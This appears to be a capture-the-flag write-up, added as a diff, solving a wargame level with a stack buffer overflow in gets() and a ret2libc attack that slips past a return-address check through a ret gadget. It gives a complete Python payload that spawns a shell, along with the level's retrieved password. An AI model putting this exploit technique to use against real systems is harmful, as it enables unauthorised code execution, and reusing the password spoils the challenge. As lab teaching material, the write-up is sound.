@@ -1,0 +1,184 @@
+*** Level2 - Stack Buffer Overflow with ret2libc Filter Bypass ***
+** Overview **
+
+The objective of this challenge is to obtain a shell by exploiting a stack-based buffer overflow in the level2 executable.
+
+Unlike the previous level, the binary contains a protection mechanism that validates the overwritten return address before execution continues. Any return address located in memory regions beginning with 0xb is rejected and causes the program to terminate.
+
+Since libc is mapped inside this region, a traditional ret2libc attack cannot be performed directly. The solution is to redirect execution through a valid address inside the executable before continuing into libc.
+
+** Reconnaissance **
+
+The first step is determining the size of the vulnerable buffer.
+
+The disassembly of main() shows:
+
+objdump -d -M intel level2
+
+Relevant instructions:
+
+sub esp,0x50
+...
+call gets
+
+The program reads user input using:
+
+gets(buffer);
+
+Since gets() performs no bounds checking, user input may overwrite adjacent stack data.
+
+To identify the exact offset to the saved return address, run the program inside gdb:
+
+gdb ./level2
+
+Test payload:
+
+run <<< $(python -c 'print("A"*80 + "BBBB")')
+
+Inspecting the stack and registers confirms that the saved instruction pointer can be overwritten after 80 bytes.
+
+The offset to EIP is therefore:
+
+80 bytes
+
+** Vulnerability Analysis **
+
+Examining function p() reveals an additional protection mechanism:
+
+mov eax,[ebp+4]
+and eax,0xb0000000
+cmp eax,0xb0000000
+jne continue
+...
+call _exit
+
+Equivalent pseudo-code:
+
+if ((return_address & 0xb0000000) == 0xb0000000)
+{
+    printf("(%p)\n", return_address);
+    exit(1);
+}
+
+The overwritten return address is inspected before the function returns.
+
+Addresses beginning with:
+
+0xb...
+
+are rejected.
+
+Since libc is loaded in this range, a direct jump to system() is not possible.
+
+** Exploitation **
+* Locating a Suitable Return Gadget *
+
+A valid address inside the executable must be used as the first overwritten return address.
+
+Using:
+
+objdump -d level2
+
+the following instructions can be found near the end of function p():
+
+0804853d: leave
+0804853e: ret
+
+The selected gadget address is:
+
+0x0804853e
+
+Because this address belongs to the executable itself (0x08...), it passes the validation check.
+
+* Locating system() *
+
+Start gdb:
+
+gdb ./level2
+
+Inside the debugger:
+
+start
+print system
+
+Example result:
+
+0xb7e6b060
+
+This address will be used to execute shell commands.
+
+* Locating "/bin/sh" *
+
+A pointer to the string /bin/sh is required as an argument to system().
+
+Display loaded memory regions:
+
+info proc mappings
+
+Search all loaded libraries:
+
+find 0xb7e2c000, +2000000, "/bin/sh"
+
+Example result:
+
+0xb7f8cc58
+
+* Payload Construction *
+
+Because the target system uses the 32-bit cdecl calling convention, function arguments are passed on the stack.
+
+When execution reaches system(), the stack must contain:
+
+ESP      -> return address
+ESP + 4  -> pointer to "/bin/sh"
+
+Required addresses:
+
+Component    |	Address
+ret gadget	 |  0x0804853e
+system()	   |  0xb7e6b060
+"/bin/sh"	   |  0xb7f8cc58
+
+Payload layout:
+
+| A * 80              |
+| 0x0804853e          |
+| 0xb7e6b060          |
+| JUNK                |
+| 0xb7f8cc58          |
+
+Python payload:
+
+(python -c 'import struct,sys
+payload  = "A"*80
+payload += struct.pack("<I",0x0804853e)
+payload += struct.pack("<I",0xb7e6b060)
+payload += "JUNK"
+payload += struct.pack("<I",0xb7f8cc58)
+sys.stdout.write(payload)'
+; cat) | ./level2
+
+After pressing Enter, the shell should be spawned.
+
+* Password Retrieval *
+
+Once the shell has been obtained:
+
+cat /home/user/level3/.pass
+
+Output:
+
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+** Why the Exploit Works **
+
+The exploit succeeds because:
+
+- gets() allows unrestricted input
+- stack memory beyond the buffer can be overwritten
+- the saved return address is fully controllable
+- the protection mechanism validates only the first return address
+- execution is first redirected to a valid address inside the executable
+- a second return transfers execution into libc and executes system("/bin/sh")
+
+The security check fails because it only validates the initial return target and does not account for chained execution flow. This allows the attacker to bypass the restriction and execute arbitrary code paths inside libc.
